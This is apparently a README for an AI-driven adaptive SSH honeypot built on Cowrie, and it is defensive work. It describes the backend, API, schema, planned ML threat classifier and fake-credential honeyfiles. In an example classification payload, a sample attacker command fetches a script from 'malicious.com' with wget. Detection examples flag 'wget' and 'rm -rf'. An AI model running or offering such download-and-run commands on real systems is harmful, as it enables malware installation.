# AI-Driven Adaptive Honeynet System

## 🎯 Project Overview

An **AI-powered adaptive honeypot system** that dynamically responds to attacker behavior in real-time. The system monitors SSH honeypot interactions, uses machine learning to classify threats, and automatically adapts the honeypot environment to engage attackers more effectively.

### Key Features

- **Real-time Log Analysis**: Monitors Cowrie SSH honeypot logs in real-time
- **ML-Based Threat Classification**: Classifies events by severity (LOW, MEDIUM, HIGH)
- **Adaptive Response System**: Automatically modifies honeypot behavior based on threat level
- **Comprehensive Analytics**: Tracks attackers, sessions, commands, and trends
- **RESTful API**: Full-featured API for event queries and statistics

---

## 📋 Implementation Status

### ✅ Phase 1: Backend Controller (IMPLEMENTED)

**Status**: **COMPLETE** ✓

The Node.js backend is fully implemented and functional.

#### Components Implemented:

**1. Database Layer** ([schema.sql](file:///c:/Users/Mohit%20Patil/Desktop/AI-Proj/HoneyNet/src/database/schema.sql))
- **4 Core Tables**:
  - `sessions` - Tracks attacker sessions with duration, event counts
| Endpoint | Purpose |
|----------|---------|
| `GET /api/events` | Paginated events with filters (severity, IP, type, date range) |
| `GET /api/events/:id` | Single event details with session context |
| `GET /api/stats` | Overall statistics and trends |
| `GET /api/stats/severity-trends` | Time-based severity analysis |
| `GET /api/attackers` | Attacker profiles and rankings |
| `GET /api/adaptations` | Adaptation history |

**4. Security Features**
- Helmet.js for HTTP security headers
- CORS protection
- Rate limiting (configurable, default: 100 req/15min)
- Input validation with Joi
- Graceful shutdown handling

**5. Logging System**
- Winston for structured logging
- Event-specific log methods
- Configurable log levels
- File and console outputs

#### Data Flow:

```mermaid
graph LR
    A[Cowrie Honeypot] -->|JSON Logs| B[Log Watcher]
    B --> C[Event Normalizer]
    C --> D[Event Processor]
    D --> E[PostgreSQL Database]
    D --> F[ML Service]
    F --> D
    D --> G[Adaptation Service]
    G --> A
    E --> H[REST API]
```

---

### ❌ Phase 2: ML Service (NOT IMPLEMENTED)

**Status**: **MISSING** ✗

#### What Should Be Implemented:

**Location**: Separate Python service (e.g., `/ml-service/`)

**Required Components**:

1. **Machine Learning Model**
   - Threat classification (LOW/MEDIUM/HIGH severity)
   - Anomaly detection using behavioral features
   - Training pipeline for model updates

2. **Feature Engineering**
   - Extract features from events:
     - Command patterns
     - Username/password combinations
     - Session duration and event frequency
     - Time-based patterns
     - IP reputation data

3. **REST API** (Expected at `http://localhost:8001`)
   - `POST /classify` - Classify single event
   - `GET /health` - Service health check
   - `POST /train` - Trigger model retraining

4. **Model Types** (Suggested)
   - Random Forest or XGBoost for classification
   - Isolation Forest for anomaly detection
   - LSTM for sequence-based pattern recognition

**Current State**:
- Backend has `mlClient.js` ready to communicate
- Expected endpoint: `${ML_SERVICE_URL}/classify`
- Health checks implemented but no service exists
- Events marked as `is_analyzed = false` until ML service available

#### Implementation Requirements:

```python
# Expected ML Service Structure
ml-service/
├── app.py                 # Flask/FastAPI server
├── models/
│   ├── classifier.pkl     # Trained classification model
│   └── scaler.pkl        # Feature scaler
├── feature_extraction.py  # Extract features from events
├── config.py             # Model configuration
└── requirements.txt      # Python dependencies
```

**Example Payload Expected**:
```json
POST /classify
{
  "event_id": "uuid",
  "event_type": "cowrie.command.input",
  "timestamp": "2024-11-29T12:00:00Z",
  "source_ip": "192.168.1.100",
  "command": "wget http://malicious.com/script.sh",
  "username": "root",
  "password": "admin123"
}
```

**Expected Response**:
```json
{
  "severity": "HIGH",
  "anomaly_score": 0.85,
  "labels": {
    "attack_type": "malware_download",
    "confidence": 0.92
  },
  "features": {
    "command_length": 42,
    "suspicious_keywords": ["wget", "http"]
  }
}
```

---

### ❌ Phase 3: Frontend Dashboard (NOT IMPLEMENTED)

**Status**: **MISSING** ✗

#### What Should Be Implemented:

**Location**: Separate React/Vue.js application (e.g., `/frontend/`)

**Required Features**:

1. **Real-time Dashboard**
   - Live event stream
   - Attack severity heatmap
   - Active sessions monitor
   - Geographic IP visualization

2. **Analytics Views**
   - Time-series charts for events/hour
   - Top attackers leaderboard
   - Command frequency analysis
   - Adaptation history timeline

3. **Event Explorer**
   - Searchable/filterable event log
   - Session replay/timeline
   - Attacker profile pages
   - ML analysis details

4. **Configuration Panel**
   - Enable/disable auto-adaptation
   - Adjust severity thresholds
   - Cooldown period settings

**Technology Stack** (Suggested):
- React.js or Vue.js
- Chart.js or D3.js for visualizations
- WebSocket for real-time updates
- TailwindCSS or Material-UI

**Current State**:
- No frontend code exists
- API is CORS-enabled (default: `http://localhost:3001`)
- All endpoints return JSON ready for consumption

---

### ❌ Phase 4: Containerization (NOT IMPLEMENTED)

**Status**: **MISSING** ✗

#### What Should Be Implemented:

**Required Files**:

1. **docker-compose.yml** - Orchestrate all services
2. **Backend Dockerfile** - Node.js container
3. **ML Service Dockerfile** - Python container
4. **Frontend Dockerfile** - React/Nginx container

**Expected Architecture**:

```yaml
services:
  database:
    image: postgres:15
    volumes: [ ./init.sql:/docker-entrypoint-initdb.d/schema.sql ]
    
  backend:
    build: ./
    depends_on: [ database, ml-service ]
    
  ml-service:
    build: ./ml-service
    
  frontend:
    build: ./frontend
    depends_on: [ backend ]
    
  cowrie:
    image: cowrie/cowrie
    volumes: [ cowrie-logs:/home/cowrie/cowrie/var/log/cowrie ]
```

**Current State**:
- No Docker configuration exists
- PM2 ecosystem file available ([ecosystem.config.js](file:///c:/Users/Mohit%20Patil/Desktop/AI-Proj/HoneyNet/ecosystem.config.js)) for process management
- Services expect local installations

---

### ❌ Phase 5: Cowrie Honeypot (NOT INCLUDED)

**Status**: **EXTERNAL DEPENDENCY** ⚠️

The system expects a Cowrie SSH honeypot to be installed and running separately.

**Required Configuration**:

1. **Cowrie Installation**
   - Install from: https://github.com/cowrie/cowrie
   - Configure JSON logging format
   - Set log path: `/home/cowrie/cowrie/var/log/cowrie/cowrie.json`

2. **Environment Variables** (`.env`):
   ```bash
   COWRIE_LOG_PATH=/home/cowrie/cowrie/var/log/cowrie/cowrie.json
   COWRIE_CONFIG_PATH=/home/cowrie/cowrie/etc/cowrie.cfg
   COWRIE_HONEYFILES_PATH=/home/cowrie/cowrie/honeyfs
   COWRIE_RESTART_COMMAND=sudo systemctl restart cowrie
   ```

3. **Adaptation Permissions**
   - Backend needs write access to Cowrie config
   - Ability to restart Cowrie service
   - File system access for honeyfiles

**Current State**:
- Mock data exists: [mock-data/cowrie.json](file:///c:/Users/Mohit%20Patil/Desktop/AI-Proj/HoneyNet/mock-data/cowrie.json)
- LogWatcher will wait for log file creation
- Adaptation service ready but requires Cowrie

---

## 🚀 Setup Instructions

### Prerequisites

- Node.js ≥16.0.0
- PostgreSQL ≥13
- Cowrie SSH honeypot (separate installation)
- Python 3.9+ (for future ML service)

### Backend Setup (Current Implementation)

#### 1. Install Dependencies

```bash
cd HoneyNet
npm install
```

#### 2. Configure Environment

```bash
cp .env.example .env
# Edit .env with your configuration
```

**Critical Environment Variables**:
```bash
# Database
DATABASE_URL=postgresql://honeynet:password@localhost:5432/honeynet

# Cowrie
COWRIE_LOG_PATH=/path/to/cowrie/var/log/cowrie/cowrie.json

# ML Service
ML_SERVICE_URL=http://localhost:8001

# Adaptation
ENABLE_AUTO_ADAPTATION=true
HIGH_SEVERITY_THRESHOLD=0.7
```

#### 3. Initialize Database

```bash
# Create database
createdb honeynet

# Run migrations
npm run migrate
```

The migration script runs [src/database/schema.sql](file:///c:/Users/Mohit%20Patil/Desktop/AI-Proj/HoneyNet/src/database/schema.sql) which creates:
- All tables with UUID primary keys
- Indexes for performance
- Triggers for timestamp updates
- Views for common queries

#### 4. Start Backend

**Development Mode**:
```bash
npm run dev  # Runs with nodemon
```

**Production Mode**:
```bash
npm start  # Standard Node.js
# or
pm2 start ecosystem.config.js  # PM2 process manager
```

#### 5. Verify Backend

```bash
# Health check
curl http://localhost:3000/health

# Expected response
{
  "status": "healthy",
  "timestamp": "2024-11-29T...",
  "database": "connected",
  "logWatcher": "active"  # or "inactive" if Cowrie logs missing
}
```

### Known Limitations (Backend Only)

1. **ML Service Not Available**
   - Events will be stored but not classified
   - `severity` stays as 'UNKNOWN'
   - `is_analyzed` remains `false`
   - Auto-adaptation won't trigger

2. **No Frontend**
   - API works but no visualization
   - Must use curl/Postman to view data

3. **Cowrie Required**
   - Backend waits for log file
   - Will log warnings if missing
   - Can test with mock data

---

## 🔧 Testing the Current Implementation

### Using Mock Data

```bash
# Simulate Cowrie logs with mock data
cat mock-data/cowrie.json >> /path/to/cowrie/cowrie.json
```

### API Testing Examples

#### Get Recent Events
```bash
curl "http://localhost:3000/api/events?limit=10&severity=HIGH"
```

#### Get Statistics
```bash
curl http://localhost:3000/api/stats
```

#### Get Top Attackers
```bash
curl http://localhost:3000/api/attackers?sort=threat&limit=5
```

#### Filter Events by IP
```bash
curl "http://localhost:3000/api/events?source_ip=192.168.1.100"
```

---

## 🏗️ Architecture & Data Flow

### System Architecture

```mermaid
graph TB
    subgraph "MISSING: Frontend"
        UI[Dashboard UI]
        WS[WebSocket Connection]
    end
    
    subgraph "IMPLEMENTED: Backend"
        API[REST API<br/>Express.js]
        LW[Log Watcher<br/>Tail Service]
        EP[Event Processor]
        AS[Adaptation Service]
    end
    
    subgraph "IMPLEMENTED: Database"
        PG[(PostgreSQL<br/>Events, Sessions,<br/>Attackers, Adaptations)]
    end
    
    subgraph "MISSING: ML Service"
        ML[ML Classifier<br/>Python/scikit-learn]
    end
    
    subgraph "EXTERNAL: Honeypot"
        CH[Cowrie Honeypot<br/>SSH Emulator]
        LOGS[cowrie.json logs]
    end
    
    CH -->|Writes| LOGS
    LW -->|Monitors| LOGS
    LW --> EP
    EP --> PG
    EP -.->|HTTP| ML
    ML -.-> EP
    EP --> AS
    AS -.->|Modify Config| CH
    PG --> API
    UI -.->|HTTP| API
    API -.-> WS
```

### Event Processing Pipeline

```mermaid
sequenceDiagram
    participant Cowrie
    participant LogWatcher
    participant Normalizer
    participant Processor
    participant Database
    participant ML Service
    participant Adaptation
    
    Cowrie->>LogWatcher: Write JSON event
    LogWatcher->>Normalizer: Parse line
    Normalizer->>Processor: Normalized event
    Processor->>Database: Store event
    Processor->>Database: Update session
    Processor->>Database: Update attacker
    Processor->>ML Service: Classify event
    ML Service->>Processor: Severity + score
    Processor->>Database: Update with ML results
    
    alt severity == HIGH
        Processor->>Adaptation: Trigger adaptation
        Adaptation->>Cowrie: Modify config/files
        Adaptation->>Database: Record adaptation
    end
```

---

## 📊 Database Schema

### Tables Overview

#### `sessions`
Tracks attacker sessions from connection to disconnect.

| Column | Type | Description |
|--------|------|-------------|
| id | UUID | Primary key |
| session_id | VARCHAR | Cowrie session identifier |
| source_ip | VARCHAR | Attacker IP address |
| start_time | TIMESTAMP | Session start |
| end_time | TIMESTAMP | Session end (null if active) |
| event_count | INTEGER | Total events in session |
| command_count | INTEGER | Commands executed |
| successful_login | BOOLEAN | Did attacker login successfully |
| is_active | BOOLEAN | Session still ongoing |

#### `events`
All honeypot events with ML analysis.

| Column | Type | Description |
|--------|------|-------------|
| id | UUID | Primary key |
| event_type | VARCHAR | cowrie.login.success, cowrie.command.input, etc |
| timestamp | TIMESTAMP | Event occurrence time |
| source_ip | VARCHAR | Attacker IP |
| command | TEXT | Shell command executed |
| severity | VARCHAR | LOW/MEDIUM/HIGH (from ML) |
| anomaly_score | FLOAT | ML anomaly score 0-1 |
| is_analyzed | BOOLEAN | Has ML processed this |
| raw_event | JSONB | Original Cowrie JSON |

#### `attackers`
Behavioral profiles of attacking IPs.

| Column | Type | Description |
|--------|------|-------------|
| ip_address | VARCHAR | Attacker IP (unique) |
| threat_level | VARCHAR | LOW/MEDIUM/HIGH/CRITICAL |
| total_events | INTEGER | All events from this IP |
| high_severity_count | INTEGER | High-severity events |
| most_common_username | VARCHAR | Favorite username tried |
| unique_passwords_count | INTEGER | Password variety |

#### `adaptations`
History of adaptive actions taken.

| Column | Type | Description |
|--------|------|-------------|
| action_type | VARCHAR | BANNER_CHANGE, HONEYFILE_ADDITION, etc |
| severity | VARCHAR | Trigger severity level |
| action_details | JSONB | What was changed |
| success | BOOLEAN | Did action execute successfully |
| old_config | JSONB | Previous configuration |
| new_config | JSONB | Updated configuration |

---

## 🔄 Adaptive Behaviors

The system can automatically modify the honeypot environment based on attacker behavior.

### Trigger Conditions

- **HIGH Severity Event** detected by ML
- Auto-adaptation enabled (`ENABLE_AUTO_ADAPTATION=true`)
- Not in cooldown period (default: 300 seconds)

### Adaptation Types

| Action | When | What It Does |
|--------|------|--------------|
| **Banner Change** | Random attackers | Modifies SSH banner to appear as different OS/service |
| **Fake AWS Creds** | Attacker searches for AWS | Adds `.aws/credentials` with fake keys |
| **Fake DB Config** | SQL-related commands | Creates fake `database.conf` with credentials |
| **Fake SSH Keys** | Key enumeration attempts | Adds `.ssh/id_rsa` private key (fake) |
| **Fake Backup Script** | Looking for cron/backups | Adds `backup.sh` with sensitive-looking paths |

### Implementation Details

All adaptations are implemented in [adaptationService.js](file:///c:/Users/Mohit%20Patil/Desktop/AI-Proj/HoneyNet/src/services/adaptationService.js):

- Modifies Cowrie configuration files
- Creates/updates honeyfiles in Cowrie filesystem
- Records all changes in database
- Can rollback if needed
- Restarts Cowrie service after changes

---

## 🐛 Troubleshooting

### Common Issues

#### 1. Log Watcher Not Starting

**Symptom**: Backend starts but shows `logWatcher: inactive`

**Causes**:
- Cowrie not installed/running
- Incorrect `COWRIE_LOG_PATH` in `.env`
- Permission issues

**Solutions**:
```bash
# Check if Cowrie is running
ps aux | grep cowrie

# Verify log file exists
ls -la /home/cowrie/cowrie/var/log/cowrie/cowrie.json

# Check permissions
sudo chown youruser:yourgroup /path/to/cowrie/var/log/cowrie/cowrie.json
```

#### 2. ML Service Warnings

**Symptom**: Logs show `ML service is not healthy, skipping classification`

**Cause**: ML service not implemented yet

**Workaround**:
- Events still stored in database
- Can manually update severity later:
```sql
UPDATE events SET severity = 'HIGH' WHERE command LIKE '%rm -rf%';
```

#### 3. Database Connection Failed

**Symptom**: `Error: connect ECONNREFUSED ::1:5432`

**Solutions**:
```bash
# Start PostgreSQL
sudo systemctl start postgresql

# Verify connection
psql -U honeynet -d honeynet

# Check DATABASE_URL in .env matches your setup
```

#### 4. Adaptation Failures

**Symptom**: Adaptations recorded with `success: false`

**Causes**:
- Cowrie not running
- Permission issues for config/file modifications
- Invalid paths in environment variables

**Solutions**:
```bash
# Grant write permissions
chown -R youruser:yourgroup /home/cowrie/cowrie/etc
chown -R youruser:yourgroup /home/cowrie/cowrie/honeyfs

# Test Cowrie restart command
sudo systemctl restart cowrie
```

---

## 📈 Next Steps for Complete Implementation

To make this a fully functional AI-driven honeypot, implement in this order:

### Priority 1: ML Service (Critical)

Without this, the system cannot classify threats or trigger adaptations effectively.

**Steps**:
1. Create `/ml-service/` directory
2. Implement Flask/FastAPI server
3. Train classification model on honeypot data
4. Deploy at `http://localhost:8001`
5. Test `/classify` endpoint

**Estimated Effort**: 2-3 weeks

### Priority 2: Docker Containerization (High)

Makes deployment and scaling much easier.

**Steps**:
1. Write Dockerfiles for backend, ML service, frontend
2. Create `docker-compose.yml`
3. Configure networking between containers
4. Add volume mounts for persistence

**Estimated Effort**: 3-5 days

### Priority 3: Frontend Dashboard (Medium)

Visualization significantly improves usability.

**Steps**:
1. Set up React/Vue.js project
2. Create dashboard with charts
3. Implement real-time WebSocket updates
4. Add event explorer and search

**Estimated Effort**: 2-3 weeks

### Priority 4: Testing & CI/CD (Medium)

**Steps**:
1. Write unit tests for services
2. Integration tests for API endpoints
3. Set up GitHub Actions
4. Add test coverage reporting

**Estimated Effort**: 1 week

---

## 📄 License

MIT License

---

## 🤝 Contributing

This is currently a backend-only implementation. Contributions welcome for:
- ML service implementation
- Frontend development
- Docker containerization
- Documentation improvements

---

## 📞 Support

For issues or questions:
- Backend issues: Check logs in `./logs/app.log`
- Database issues: Run health check at `/health`
- API documentation: Visit `http://localhost:3000/api/`

---

**Last Updated**: November 29, 2024  
**Implementation Status**: Backend Only (Phase 1 Complete)  
**Ready for**: Development of ML Service & Frontend
